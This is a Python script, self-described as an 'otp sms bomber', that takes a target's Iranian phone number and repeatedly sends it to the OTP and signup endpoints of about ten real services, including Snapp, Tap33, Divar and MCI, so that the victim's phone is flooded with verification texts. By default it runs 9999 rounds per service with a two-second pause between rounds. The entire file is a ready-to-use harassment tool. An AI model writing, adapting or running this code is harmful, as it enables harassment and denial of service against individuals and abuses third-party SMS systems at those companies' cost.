from argparse import ArgumentParser
from urllib import request
from urllib3 import PoolManager
from json import dumps
from time import sleep
from re import search
import os
os.system( 'cls' )
green='\033[32m'
red='\033[31m'
def send(cellphone):
    http = PoolManager()
    # 0. snap otp [OK]
    http.request("post", "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
        headers={'Content-Type': 'application/json'},
        body=dumps({"cellphone": f"+98{cellphone}"}).encode())
    
    # 1. snap driver [OK]
    http.request("post", "https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp",
        headers={'Content-Type': 'application/json'},
        body=dumps({"cellphone": f"0{cellphone}"}).encode())
    #2. tap33 otp [OK]
    http.request("post", "https://tap33.me/api/v2/user",
        headers={'Content-Type': 'application/json'},
        body=dumps({"credential": {"phoneNumber": f"0{cellphone}", "role": "PASSENGER"}}).encode())

    # 3. delino [OK]
    http.request("post", "https://www.delino.com/user/register",
        headers={'Content-Type': 'application/json'},
        body=dumps({"mobile": f'0{cellphone}'}).encode())

    # 4. divar [OK]
    http.request("post", "https://api.divar.ir/v5/auth/authenticate",
        headers={'Content-Type': 'application/json'},
        body=dumps({"phone": f'0{cellphone}'}).encode())

    # 4. mamifood [OK]
    http.request("post", "https://mamifood.org/Registration.aspx/SendValidationCode",
        headers={'Content-Type': 'application/json'},
        body=dumps({"Phone": f'0{cellphone}'}).encode())

    # 4. hamrahaval [OK]
    http.request("post", "https://api-ebcom.mci.ir/services/auth/v1.0/otp",
        headers={'Content-Type': 'application/json'},
        body=dumps({"msisdn": f'{cellphone}'}).encode())

    #shab.ir
    http.request("post", "https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile",
        headers={'Content-Type': 'application/json'},
        body=dumps({"mobile": f"0{cellphone}", "country_code": "+98"}).encode())

    # otaghak
    http.request("post", "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode",
        headers={'Content-Type': 'application/json'},
        body=dumps({"userName": f"0{cellphone}"}).encode())
    http.request("post", "https://api.snapp.ir/api/v1/sms/link",
        headers={'Content-Type': 'application/json'},
        body=dumps({"phone": f"0{cellphone}"}).encode())
    
def spam(args):
    if (search(r'9\d{9}$', args.cellphone)):
        for time in range(args.times):
            print(f"\r{green} @Pooya_Killer | Sending sms {red}{time+1}/{args.times}", end='')
            try:
                send(args.cellphone)
            except KeyboardInterrupt:
                exit()
            sleep(2)
        print('')
    else:
        print("error: invalid cellphone format, format: 9\d{9} e.g. 90157xxxx")

def main():
    parser = ArgumentParser(prog="asmsb",
        description="otp sms bomber",
        epilog="By #Mmd_ToRm")
    parser.add_argument("cellphone", help="target cellphone: e.g. 90157xxxxx")
    parser.add_argument("--times", help="count of SMSs (per service!)", type=int, default=9999)
    spam(parser.parse_args())

if (__name__ == "__main__"):
    main()
